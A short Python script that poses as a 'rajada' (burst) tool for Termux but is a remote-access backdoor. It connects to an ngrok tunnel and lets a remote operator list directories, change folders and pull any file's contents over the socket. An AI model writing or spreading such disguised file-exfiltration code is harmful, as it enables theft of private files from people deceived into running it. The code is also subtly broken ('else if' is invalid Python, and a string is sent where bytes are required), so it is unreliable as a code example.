# HOST="1.tcp.ngrok.io" PORT=12345 python client.py

import os
import socket
from os import chdir, getcwd, listdir
from os.path import isfile
print("Rajada melhorada, deixe o termux rodando e vai rajar")
host = '0.tcp.sa.ngrok.io'
port = 19018

# Create a TCP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


chdir('..')
# Connect to the server with the socket via our ngrok tunnel
server_address = (host, port)
sock.connect(server_address)

message = 'bixaXXXXXXXXXXX'
data_received = 0
data_expected = len(message)

while data_received < data_expected:
    data = sock.recv(1024)
    data_received += len(data)
    # print("Received: {}".format(data.decode("utf-8")))
    for c in listdir():
        if data.decode("utf-8") == 'x':
            sock.send(f'{c}  \n '.encode())
        else if '/cd' in data.decode("utf-8"):
            chdir(data.decode("utf-8")[3:len(data.decode("utf-8")) - 3])
            sock.send('Feito!')
        else:
            t = open(data.decode("utf-8"), 'rb')
            msm = t.read()

            sock.send(msm)


# sock.close()

# Send the message
# Await a response

sock.close()
